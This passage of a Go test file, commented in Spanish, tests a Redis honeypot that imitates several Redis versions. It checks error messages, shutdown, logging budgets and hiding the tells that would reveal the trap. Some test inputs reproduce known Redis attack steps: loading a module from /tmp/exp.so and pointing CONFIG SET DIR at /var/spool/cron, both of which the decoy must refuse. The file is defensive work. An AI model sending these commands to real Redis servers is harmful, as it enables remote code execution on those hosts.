		{"7.2.4", []string{"CLIENT", "FOO"}, "-ERR unknown subcommand 'FOO'. Try CLIENT HELP.\r\n"},
		{"7.0.15", []string{"CLIENT", "SETINFO", "LIB-NAME", "x"}, "-ERR unknown subcommand 'SETINFO'. Try CLIENT HELP.\r\n"},
		{"7.2.4", []string{"MODULE", "FOO"}, "-ERR unknown subcommand 'FOO'. Try MODULE HELP.\r\n"},
		{"6.2.14", []string{"MEMORY", "FOO"}, "-ERR Unknown subcommand or wrong number of arguments for 'FOO'. Try MEMORY HELP.\r\n"},
		{"7.2.4", []string{"SCRIPT", "FOO"}, "-ERR unknown subcommand 'FOO'. Try SCRIPT HELP.\r\n"},
		{"7.2.4", []string{"CLUSTER", "INFO"}, "-ERR This instance has cluster support disabled\r\n"},
		{"7.2.4", []string{"CLUSTER", "FOO"}, "-ERR unknown subcommand 'FOO'. Try CLUSTER HELP.\r\n"},
		{"6.2.14", []string{"CLUSTER", "FOO"}, "-ERR This instance has cluster support disabled\r\n"},
		{"7.2.4", []string{"OBJECT", "ENCODING", "no-existe"}, "$-1\r\n"},
	}
	for _, c := range casos {
		s := servidorPrueba(t, conf{version: c.version})
		cli := clientePrueba(s, "198.51.100.1")
		if out, _ := ejecutar(s, cli, c.args...); out != c.quiere {
			t.Errorf("%s %.40q:\n dio    %q\n quiere %q", c.version, c.args, out, c.quiere)
		}
	}
	// Lo desconocido se rechaza antes que la falta de AUTH, como en Redis.
	s := servidorPrueba(t, conf{version: "7.2.4", contrasena: "x"})
	cli := clientePrueba(s, "198.51.100.1")
	if out, _ := ejecutar(s, cli, "FOO"); !strings.HasPrefix(out, "-ERR unknown command 'FOO'") {
		t.Fatalf("sin autenticar, un comando desconocido debería dar unknown command: %q", out)
	}
}

// HTTP contra Redis: con "POST" o "Host:" Redis cierra sin contestar.
func TestHTTPContraRedisCierraSinContestar(t *testing.T) {
	s := servidorPrueba(t, conf{})
	cli := clientePrueba(s, "198.51.100.1")
	for _, args := range [][]string{{"POST", "/", "HTTP/1.1"}, {"Host:", "example.com"}} {
		if out, cerrar := ejecutar(s, cli, args...); out != "" || !cerrar {
			t.Fatalf("%v debería cerrar sin contestar: %q, %v", args, out, cerrar)
		}
	}
	args, err := leer("POST / HTTP/1.1\r\n", 65536, true)
	if err != nil || nombreComando(args[0]) != "POST" {
		t.Fatalf("la línea HTTP debería trocearse como inline: %v %v", args, err)
	}
}

// ---- Hallazgo 7: SIGTERM para la trampa en orden ----------------------------

// Con la parada (lo que hace SIGTERM vía NotifyContext), servir termina sin
// esperar a plazoParada, cada conexión abierta apunta su cierre y queda el
// resumen de rechazos del periodo.
func TestParadaTerminaEnSeguidaYDejaLosResumenes(t *testing.T) {
	s, dir, parar := servidorTCP(t, conf{maxConex: 1, maxConexIP: 1})
	a, err := net.Dial("tcp", dir)
	if err != nil {
		t.Fatal(err)
	}
	defer a.Close()
	ra := bufio.NewReader(a)
	a.Write(orden("PING"))
	if l, _ := ra.ReadString('\n'); l != "+PONG\r\n" {
		t.Fatalf("PING: %q", l)
	}
	b, err := net.Dial("tcp", dir)
	if err != nil {
		t.Fatal(err)
	}
	if l, _ := bufio.NewReader(b).ReadString('\n'); !strings.Contains(l, "max number of clients") {
		t.Fatalf("la segunda conexión debería rechazarse: %q", l)
	}
	b.Close()

	// No se mide un tiempo fijo (dependería de la máquina): lo que no puede
	// pasar es que la parada espere a que venza plazoParada porque una
	// conexión no se entera, y entonces tardaría al menos eso.
	inicio := time.Now()
	parar()
	if d := time.Since(inicio); d >= plazoParada {
		t.Fatalf("la parada esperó %v: alguna conexión no se cortó", d)
	}
	cerrada, rechazos := false, false
	for _, m := range lineas(t, s.cfg.registro) {
		switch m["eventid"] {
		case "redis.session.closed":
			cerrada = true
		case "redis.session.rechazos":
			rechazos = true
		}
	}
	if !cerrada || !rechazos {
		t.Fatalf("al parar deberían quedar el cierre de la sesión (%v) y el resumen de rechazos (%v)", cerrada, rechazos)
	}
	// El listener está cerrado: ya no acepta.
	if c, err := net.DialTimeout("tcp", dir, 200*time.Millisecond); err == nil {
		c.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
		if _, err := c.Read(make([]byte, 1)); err != io.EOF && err == nil {
			t.Fatal("tras parar no debería atender conexiones")
		}
		c.Close()
	}
}

// ---- Hallazgo 8: detalles que delataban la trampa ---------------------------

func TestDetallesQueDelatabanLaTrampa(t *testing.T) {
	for _, v := range []string{"7.2.4", "7.0.15", "6.2.14"} {
		s := servidorPrueba(t, conf{version: v})
		a := clientePrueba(s, "203.0.113.9")
		b := clientePrueba(s, "203.0.113.9")
		b.publicar()
		otro := clientePrueba(s, "198.51.100.77")
		otro.publicar()

		lista, _ := ejecutar(s, a, "CLIENT", "LIST")
		ls := strings.Split(strings.TrimSpace(lista[strings.Index(lista, "\r\n")+2:]), "\n")
		if len(ls) != 2 || strings.Contains(lista, "198.51.100.77") {
			t.Fatalf("%s: CLIENT LIST debería enseñar solo las 2 conexiones de su IP: %q", v, lista)
		}
		if n := campo(s.infoTexto(a, []string{"INFO", "clients"}), "connected_clients"); n != "2" {
			t.Fatalf("%s: connected_clients debería cuadrar con CLIENT LIST (2), es %s", v, n)
		}
		info, _ := ejecutar(s, a, "CLIENT", "INFO")
		for _, mal := range []string{"laddr=127.0.0.1", "laddr=0.0.0.0", "tot-mem=0 ", "watch=", "tot-net-in"} {
			if strings.Contains(info, mal) {
				t.Fatalf("%s: CLIENT INFO no debería llevar %q: %q", v, mal, info)
			}
		}
		if !strings.Contains(info, "laddr="+s.id.ipLocal+":") {
			t.Fatalf("%s: laddr debería ser la IP privada de la máquina: %q", v, info)
		}
		tiene := func(c string) bool { return strings.Contains(info, " "+c) }
		switch v {
		case "7.2.4":
			if !tiene("lib-name=") || !tiene("resp=2") || !tiene("ssub=0") || !tiene("cmd=client|info") {
				t.Fatalf("7.2: faltan campos de su versión: %q", info)
			}
		case "7.0.15":
			if tiene("lib-name=") || !tiene("resp=2") || !tiene("cmd=client|info") {
				t.Fatalf("7.0: campos que no son de su versión: %q", info)
			}
		case "6.2.14":
			if tiene("resp=") || tiene("ssub=") || tiene("multi-mem=") || !tiene("cmd=client ") {
				t.Fatalf("6.2: campos que no son de su versión: %q", info)
			}
		}

		debug, _ := ejecutar(s, a, "DEBUG", "SLEEP", "0")
		module, _ := ejecutar(s, a, "MODULE", "LOAD", "/tmp/exp.so")
		if v != "6.2.14" {
			if !strings.HasPrefix(debug, "-ERR DEBUG command not allowed.") {
				t.Fatalf("%s: DEBUG SLEEP debería rechazarse entero con enable-debug-command no: %q", v, debug)
			}
			if !strings.HasPrefix(module, "-ERR MODULE command not allowed. If the enable-module-command option") {
				t.Fatalf("%s: MODULE LOAD debería rechazarse con enable-module-command no: %q", v, module)
			}
			if out, _ := ejecutar(s, a, "CONFIG", "SET", "DIR", "/var/spool/cron"); out != "-ERR CONFIG SET failed (possibly related to argument 'DIR') - can't set protected config\r\n" {
				t.Fatalf("%s: CONFIG SET DIR: %q", v, out)
			}
		} else if debug != "+OK\r\n" {
			t.Fatalf("6.2: DEBUG SLEEP 0 debería dar +OK: %q", debug)
		}
		if out, _ := ejecutar(s, a, "MEMORY", "DOCTOR"); !strings.Contains(out, "Hi Sam, this instance is empty or is using very little memory") {
			t.Fatalf("%s: MEMORY DOCTOR debería dar el texto real de instancia vacía: %q", v, out)
		}
		if out, _ := ejecutar(s, a, "ACL", "LIST"); !strings.Contains(out, "user default on nopass sanitize-payload ~* &* +@all") {
			t.Fatalf("%s: ACL LIST en modo abierto: %q", v, out)
		}
	}
	s := servidorPrueba(t, conf{version: "7.2.4", contrasena: "Prueba-2026"})
	cli := clientePrueba(s, "198.51.100.1")
	ejecutar(s, cli, "AUTH", "Prueba-2026")
	h := sha256.Sum256([]byte("Prueba-2026"))
	if out, _ := ejecutar(s, cli, "ACL", "LIST"); !strings.Contains(out, "user default on sanitize-payload #"+hex.EncodeToString(h[:])+" ~* &* +@all") || strings.Contains(out, "nopass") {
		t.Fatalf("ACL LIST con contraseña no debería decir nopass: %q", out)
	}
}

// ---- Hallazgo 9: un reinicio no carga todo a la bolsa general ---------------

func TestReinicioElMismoDiaRehaceLoGastadoDeCadaBolsa(t *testing.T) {
	ruta := filepath.Join(t.TempDir(), "redis.json")
	rel := &reloj{t: time.Date(2026, 10, 16, 12, 30, 0, 0, time.UTC)}
	const tope = 4 << 20
	reg, err := nuevoRegistrador(ruta, tope, time.Hour, rel.ahora)
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 60000; i++ {
		reg.escribir(evento{EventID: "redis.command.input", Comando: "PING", Args: strings.Repeat("x", 100), SrcIP: ipPrueba(i % 200)})
		reg.escribir(evento{EventID: "redis.command.grave", Comando: "FLUSHALL", Grave: "borrado", SrcIP: ipPrueba(i % 50)})
	}
	if reg.admite("192.0.2.1", bolsaGeneral, rel.t) == "" || reg.admite("192.0.2.1", bolsaGrave, rel.t) == "" {
		t.Fatal("la prueba tiene que llenar la bolsa general y la grave de la hora")
	}
	antes := reg.gastado
	reg.cerrar()
	// La fecha del fichero tiene que ser la del reloj de la prueba.
	os.Chtimes(ruta, rel.t, rel.t)

	reg2, err := nuevoRegistrador(ruta, tope, time.Hour, rel.ahora)
	if err != nil {
		t.Fatal(err)
	}
	if reg2.gastado != antes {
		t.Fatalf("tras el reinicio cada bolsa debería conservar lo gastado:\n antes %v\n ahora %v", antes, reg2.gastado)
	}
	if g := reg2.gastoIP(ipPrueba(0)); g[bolsaGeneral] == 0 || g[bolsaGrave] == 0 {
		t.Fatalf("tras el reinicio se debería rehacer también lo gastado por IP: %v", g)
	}
	// A la hora siguiente se libera lo de la hora: entra una conexión nueva.
	rel.t = time.Date(2026, 10, 16, 13, 31, 0, 0, time.UTC)
	reg2.escribir(evento{EventID: "redis.session.connect", SrcIP: "203.0.113.200"})
	reg2.cerrar()
	for _, m := range lineas(t, ruta) {
		if m["eventid"] == "redis.session.connect" && m["src_ip"] == "203.0.113.200" {
			return
		}
	}
	t.Fatal("a las 13:31 una conexión nueva debería registrarse; antes el reinicio la callaba hasta las 16:31")
}
